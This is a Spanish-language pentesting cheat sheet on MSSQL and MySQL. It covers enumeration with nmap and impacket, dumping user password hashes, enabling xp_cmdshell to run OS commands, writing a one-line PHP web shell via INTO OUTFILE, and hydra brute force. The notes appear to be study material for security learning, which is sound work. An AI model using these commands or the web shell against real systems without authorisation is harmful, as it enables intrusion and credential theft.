---
tags:
---
# SQL — MSSQL y MySQL

Los servidores de bases de datos SQL son objetivos frecuentes en pentesting por la información que contienen y porque, en caso de inyección o acceso directo, pueden permitir ejecución de comandos del sistema.

Puertos por defecto: **MSSQL → 1433/TCP**, **MySQL → 3306/TCP**.

---

## Autenticación

### MSSQL

Soporta dos modos:

| Modo | Descripción |
|---|---|
| `Windows Authentication` | Usa cuentas de Windows/Active Directory. Es el modo por defecto. |
| `Mixed Mode` | Acepta cuentas Windows y cuentas propias de SQL Server (usuario/contraseña independientes). |

### MySQL

Autenticación por usuario/contraseña propios del servidor. En entornos Windows puede integrarse con autenticación de dominio mediante plugins.

---

## Bases de datos del sistema

### MySQL

| BD | Descripción |
|---|---|
| `mysql` | Tablas internas del servidor (usuarios, permisos) |
| `information_schema` | Metadatos de todas las BDs: tablas, columnas, tipos |
| `performance_schema` | Monitorización de rendimiento |
| `sys` | Objetos de ayuda para DBA basados en performance_schema |

### MSSQL

| BD | Descripción |
|---|---|
| `master` | Configuración global de la instancia |
| `msdb` | Usado por SQL Server Agent |
| `model` | Plantilla para nuevas BDs |
| `resource` | BDs de objetos del sistema (solo lectura) |
| `tempdb` | Objetos temporales |

---

## Enumeración

### Nmap

```bash
nmap -sV -p 1433,3306 <IP>
nmap -p 1433 --script ms-sql-info,ms-sql-config <IP>
nmap -p 3306 --script mysql-info,mysql-enum <IP>
```

### Conexión directa

```bash
# MySQL
mysql -h <IP> -u root -p
mysql -h <IP> -u root -p''  # Sin contraseña

# MSSQL (con impacket)
mssqlclient.py usuario:contraseña@<IP>
mssqlclient.py usuario:contraseña@<IP> -windows-auth
```

---

## Comandos básicos de enumeración

### MySQL

```sql
SHOW DATABASES;
USE nombre_bd;
SHOW TABLES;
SELECT * FROM tabla LIMIT 10;
SELECT user, password FROM mysql.user;
```

### MSSQL (sqlcmd)

```sql
SELECT name FROM master.dbo.sysdatabases
GO

USE nombre_bd
GO

SELECT table_name FROM information_schema.tables
GO
```

---

## Ejecución de comandos del sistema

### MSSQL — xp_cmdshell

Si el usuario tiene permisos de `sysadmin`:

```sql
-- Habilitar xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Ejecutar comando
EXEC xp_cmdshell 'whoami';
```

### MySQL — INTO OUTFILE

Si MySQL corre con permisos de escritura sobre el directorio web:

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

---

## Fuerza bruta

```bash
# MySQL
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<IP>

# MSSQL
hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://<IP>
```

---

## Ver también

- [SQL Injection](../03-explotacion-web/sql-injection-sqli.md)
